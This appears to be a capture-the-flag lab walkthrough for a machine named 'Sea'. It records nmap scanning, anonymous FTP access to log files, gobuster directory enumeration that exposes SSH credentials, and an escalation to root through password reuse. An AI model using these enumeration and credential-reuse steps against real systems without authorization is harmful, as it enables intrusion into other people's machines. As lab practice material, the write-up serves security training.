##### Tags: `password-reuse`  `directory`  `ssh`  `ftp`  `log file`

# 🐧Sea🐧
## Enumeration
Nmap
```console
$ nmap -p- -T4 -sV 192.168.106.162

PORT      STATE SERVICE VERSION
21/tcp    open  ftp     vsftpd 3.0.5
22/tcp    open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.5 (Ubuntu Linux; protocol 2.0)
80/tcp    open  http    Apache httpd 2.4.58 ((Ubuntu))
55743/tcp open  http    Apache httpd 2.4.58 ((Ubuntu))
Service Info: OSs: Unix, Linux; CPE: cpe:/o:linux:linux_kernel
```
always start with easy enumeration ftp  
logged in successfully with anonymous and found the log files
```console
$ ftp 192.168.106.162
Connected to 192.168.106.162.
220 (vsFTPd 3.0.5)
Name (192.168.106.162): anonymous
Password: 
230 Login successful.
Remote system type is UNIX.
Using binary mode to transfer files.
ftp> ls
229 Entering Extended Passive Mode (|||14624|)
150 Here comes the directory listing.
-rw-rw-r--    1 0        0            5637 Jun 14  2025 log_01.log
-rw-rw-r--    1 0        0            7181 Jun 15  2025 log_02.log
-rw-rw-r--    1 0        0            5627 Jun 14  2025 log_03.log
-rw-rw-r--    1 0        0            5687 Jun 14  2025 log_04.log
226 Directory send OK.
```
log_02.log reveals the structure of the web sever
```console
$ cat log_02.log
[2025-06-15 01:14:12] [ERROR] invalid argument in /var/www/SeaCMS/th4o4p/database.php
```
port 80 got nothing interesting  
port 55743 is running a seacms webpage  
run gobuster and found the login page and a credential in database
```console
$ gobuster dir -u http://192.168.106.162:55743 -w /usr/share/wordlists/dirb/common.txt -x php,txt,html 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.106.162:55743
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/login.php            (Status: 200) [Size: 15836]
/database.php         (Status: 200) [Size: 92]
```
```console
http://192.168.106.162:55743/database.php
$hidden_creds = [ 'ssh_user' => 'nicolas', 'ssh_password' => 'ImGonnaBeSuperhero594' ];
```
but unable to login with those credential  
we know the web structure is /th4o4p from the log file  
run gobuster and found another credential
```console
$ gobuster dir -u http://192.168.106.162:55743/th4o4p -w /usr/share/wordlists/dirb/common.txt -x php,txt,html 
===============================================================
Gobuster v3.8
by OJ Reeves (@TheColonial) & Christian Mehlmauer (@firefart)
===============================================================
[+] Url:                     http://192.168.106.162:55743/th4o4p
[+] Method:                  GET
[+] Threads:                 10
[+] Wordlist:                /usr/share/wordlists/dirb/common.txt
[+] Negative Status codes:   404
[+] User Agent:              gobuster/3.8
[+] Extensions:              php,txt,html
[+] Timeout:                 10s
===============================================================
Starting gobuster in directory enumeration mode
===============================================================
/database.php         (Status: 200) [Size: 90]
```
```console
http://192.168.106.162:55743/th4o4p/database.php
$hidden_creds = [ 'ssh_user' => 'nicolas', 'ssh_password' => 'YoureGonnaMakeIt846' ];
```
since it says ssh user then logged into ssh as nicolas
```console
$ ssh nicolas@192.168.106.162               
nicolas@sea:/$ id
uid=1001(nicolas) gid=1001(nicolas) groups=1001(nicolas)
```
## Privilege Escalation
Since i got another password from the webpage  
try and log in as root successfully
```console
nicolas@sea:/$ su root
Password: ImGonnaBeSuperhero594
root@sea:/# id
uid=0(root) gid=0(root) groups=0(root)
```
